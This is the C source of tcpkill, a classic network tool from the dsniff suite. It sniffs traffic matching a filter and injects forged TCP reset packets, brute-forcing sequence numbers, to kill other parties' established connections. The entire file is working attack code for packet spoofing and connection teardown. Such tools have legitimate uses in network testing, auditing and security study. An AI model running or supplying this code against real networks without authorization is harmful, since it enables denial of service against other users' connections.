/*
  tcpkill.c

  Kill TCP connections already in progress.

  Copyright (c) 2000 Dug Song <dugsong@monkey.org>
  
  $Id: tcpkill.c,v 1.15 2000/11/30 00:39:05 dugsong Exp $
*/

#include "config.h"

#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>
#include "pcaputil.h"
#include "version.h"

/* XXX - brute force seqnum space. ugh. */
#define DEFAULT_SEVERITY	3

/* Globals. */
int	Opt_severity = DEFAULT_SEVERITY;
int	pcap_off;

void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: tcpkill [-i interface] [-1..9] expression\n");
	exit(1);
}

/*
  XXX - we ought to determine the rate of seqnum consumption and
  predict the correct seqnum to use, instead of brute force. i suk.
*/
void
tcp_rst_loop(pcap_t *pd, int sock)
{
	struct pcap_pkthdr pkthdr;
	struct libnet_ip_hdr *ip;
	struct libnet_tcp_hdr *tcp;
	u_char *pkt, buf[IP_H + TCP_H];
	u_int32_t seq, ack;
	u_short win;
	int i;
	
	libnet_seed_prand();
	
	for (;;) {
		if ((pkt = (char *)pcap_next(pd, &pkthdr)) != NULL) {
			ip = (struct libnet_ip_hdr *)(pkt + pcap_off);
			if (ip->ip_p != IPPROTO_TCP) continue;
			
			tcp = (struct libnet_tcp_hdr *)
				((u_char *)ip + (ip->ip_hl * 4));
			if (tcp->th_flags & (TH_SYN|TH_FIN|TH_RST)) continue;
			
			ack = ntohl(tcp->th_ack);
			win = ntohs(tcp->th_win);
			
			libnet_build_ip(TCP_H, 0, 0, 0, 64, IPPROTO_TCP,
					ip->ip_dst.s_addr, ip->ip_src.s_addr,
					NULL, 0, buf);
			libnet_build_tcp(ntohs(tcp->th_dport),
					 ntohs(tcp->th_sport), 0, 0, TH_RST,
					 0, 0, NULL, 0, buf + IP_H);
			
			ip = (struct libnet_ip_hdr *)buf;
			tcp = (struct libnet_tcp_hdr *)(ip + 1);
			
			for (i = 0; i < Opt_severity; i++) {
				ip->ip_id = libnet_get_prand(PRu16);
				seq = ack + (i * win);
				tcp->th_seq = htonl(seq);
				
				libnet_do_checksum(buf, IPPROTO_TCP, TCP_H);

				if (libnet_write_ip(sock, buf, sizeof(buf)) < 0)
					warn("write_ip");
				
				fprintf(stderr, "%s:%d > %s:%d: R %u:%u(0) win 0\n",
					libnet_host_lookup(ip->ip_src.s_addr, 0),
					ntohs(tcp->th_sport),
					libnet_host_lookup(ip->ip_dst.s_addr, 0),
					ntohs(tcp->th_dport), seq, seq);
			}
		}
	}
}

int
main(int argc, char *argv[])
{
	int c, sock;
	char *p, *intf, *filter, ebuf[PCAP_ERRBUF_SIZE];
	pcap_t *pd;
	
	intf = NULL;
	
	while ((c = getopt(argc, argv, "i:123456789h?V")) != -1) {
		switch (c) {
		case 'i':
			intf = optarg;
			break;
		case '0': case '1': case '2': case '3': case '4':
		case '5': case '6': case '7': case '8': case '9':
			p = argv[optind - 1];
			if (p[0] == '-' && p[1] == c && p[2] == '\0')
				Opt_severity = atoi(++p);
			else
				Opt_severity = atoi(argv[optind] + 1);
			break;
		default:
			usage();
			break;
		}
	}
	if (intf == NULL && (intf = pcap_lookupdev(ebuf)) == NULL)
		errx(1, "%s", ebuf);

	argc -= optind;
	argv += optind;
	
	if (argc == 0)
		usage();
	
	filter = copy_argv(argv);
	
	if ((pd = pcap_init(intf, filter, 128)) == NULL)
		errx(1, "couldn't initialize sniffing");

	if ((pcap_off = pcap_dloff(pd)) < 0)
		errx(1, "couldn't determine link layer offset");
	
	if ((sock = libnet_open_raw_sock(IPPROTO_RAW)) == -1)
		errx(1, "couldn't initialize sending");
	
	warnx("listening on %s [%s]", intf, filter);
	
	tcp_rst_loop(pd, sock);
  
	/* NOTREACHED */
	
	exit(0);
}
